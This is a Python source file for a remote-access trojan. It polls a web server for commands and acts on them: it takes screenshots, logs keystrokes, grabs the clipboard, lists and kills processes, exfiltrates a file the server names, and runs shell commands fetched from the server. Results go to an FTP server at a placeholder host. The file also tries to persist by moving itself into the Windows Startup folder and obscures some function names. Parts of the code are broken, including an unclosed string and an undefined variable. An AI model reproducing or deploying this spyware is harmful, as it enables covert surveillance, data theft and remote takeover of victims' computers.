import ftplib
import os
import sys
import pynput
import pyautogui
from random import *
from time import *
import webbrowser
import datetime
import psutil
import pyperclip
import requests
import logging
import shutil
import getpass
import keyboard
import subprocess
from pynput.keyboard import Key,Listener

class RemoteControl:
    def connectToServer(self):
        session=ftplib.FTP('files.ftpserver.com','yourftpsite','yourftppassword')
    def a6772616253637265656e0d0a(): #screen
            #print("Allmami").format(str(Kazzina))
            campylobacter=datetime.datetime.now()
            session=ftplib.FTP('files.0ftpserver.com','yourftpsite','yourftppassword')
            pic=pyautogui.screenshot()
            pic.save("bacteria.png")
            marlin=open("bacteria.png","rb")
            session.storbinary('APPE bacteria{}.png'.format(str(campylobacter)),marlin)
            marlin.close()
            session.quit()
            os.remove("bacteria.png")
            sleep(100)
    def getClip():
        ksk=datetime.datetime.now()
        session=ftplib.FTP('files.ftpserver.com','yourftpsite','yourftppassword')
        s=pyperclip.paste()
        g=open("clip.txt","w")
        g.write(s)
        g.close()
        f=open('clip.txt','rb')       
        session.storbinary('STOR CoPY{0}.txt'.format(str(ksk)),f)
        session.quit()
        f.close()
        os.remove("clip.txt")
        sleep(100)
    def openProgram():
        url=requests.get("https://yourftpsite.ftpserver.com/programs.txt")
        s=url.text
        subprocess.Popen(s,shell=False)
        sleep(100)
    def capFile():
                ksk=datetime.datetime.now()

                session=ftplib.FTP('files.ftpserver.com','yourftpsite','yourftppassword')
                url=requests.get("https://yourftpsite.ftpserver.com/programs")
                a=url.text
                f=open(a,"rb")
                session.storbinary("STOR capture{0}.txt".format(str(ksk)),f)
                session.quit()
                f.close()
                sleep(60)

                        
    def b7015657273trEmor697374(): #persist
        try:
            tenor=getpass.getuser()
            shutil.move(cwd,"C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\Startup".format(tenor))

        except Exception as e:
            try:
                shutil.move(cwd,"C:\\Program Data\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            except Exception as err:
                requests.get("mail.ru")
    def getrProc():
            ksk=datetime.datetime.now()

            session=ftplib.FTP('files.ftpserver.com','yourftpsite','yourftppassword')
            f=open("procs.txt","w")

            for proc in psutil.process_iter():
                f.write(str(proc))
            f.close()
            t=open("procs.txt","rb")
            session.storbinary("STOR procs{0}.txt".format(str(ksk)),t)
            session.quit()
            t.close()
            os.remove("procs.txt")
            sleep(120)
   
    def stop_log():
        ksk=datetime.datetime.now()

        session=ftplib.FTP('files.ftpserver.com','yourftpsite','yourftppassword')

        t=keyboard.stop_recording()
        l=open("cook.txt","w")
        l.write(str(t))
        l.close()
        m=open("cook.txt","rb")
        session.storbinary("STOR logs{0}.txt".format(str(ksk)),m)
        m.close()
        session.quit()
        os.remove("cook.txt")
        sleep(30)
    def shell_user():
            r=requests.get("https://yourftpsite.ftpserver.com/programs.txt")
            s=r.text
            output=subprocess.getoutput(s)
            f=open("micro.txt","w")
            f.write(str(output))
            f.close()
            session=ftplib.FTP('files.0ftpserver.com','yourftpsite','yourftppassword')
            t=open("micro.txt","rb")
            session.storbinary("STOR output.txt",t)
            session.quit()
            t.close()
            os.remove("micro.txt")
            sleep(30)

    def get_user():
            session=ftplib.FTP('files.ftpserver.com','yourftpsite','yourftppassword')

            user=getpass.getuser()
            f=open("lol.txt","w")
    def start_log():
        keyboard.start_recording()
        sleep(180)
        RemoteControl.stop_log()
    def killProc():
            r=requests.get("https://yourftpsite.ftpserver.com/programs.txt")
            s=r.text
            subprocess.Popen("taskkill /f /im {0}".format(str(s)),shell=False)
            #os.system("taskkill /f /im {0}".format(str(s)))
            sleep(60)

    def navigate():
            session=ftplib.FTP('files.ftpserver.com','yourftpsite','yourftppassword')
            r=requests.get("https://yourftpsite.ftpserver.com/commands.file)
            t=r.text
            webbrowser.open(t,new=2)
            sleep(30)


        

    def getCommands(self):
        session=ftplib.FTP('files.0ftpserver.com','yourftpsite','yourftppassword')
        r=requests.get("https://yourftpsite.ftpserver.com/commands")
        t=r.text
        if "grab screen" in t:
            RemoteControl.a6772616253637265656e0d0a()
        elif "persist" in t:
            RemoteControl.b7015657273trEmor697374()
        elif "open" in t:
            RemoteControl.openProgram()
        elif "fetchproc" in t:
            RemoteControl.getrProc()
        elif "keyscan" in t:
            RemoteControl.start_log()
        elif "clipscan" in t:
            RemoteControl.getClip()
        elif "reconnect" in t:
            RemoteControl.connectToServer()
        elif "http" in t:
            RemoteControl.navigate()
        elif "kill" in t:
            RemoteControl.killProc()
        elif "shell" in t:
            RemoteControl.shell_user()
        elif "capture" in t:
            RemoteControl.capFile()
        elif "" in t:
            sleep(5)
            RemoteControl.getCommands(self)
            

local=RemoteControl()
local.connectToServer()
while True:
    local.getCommands()
        
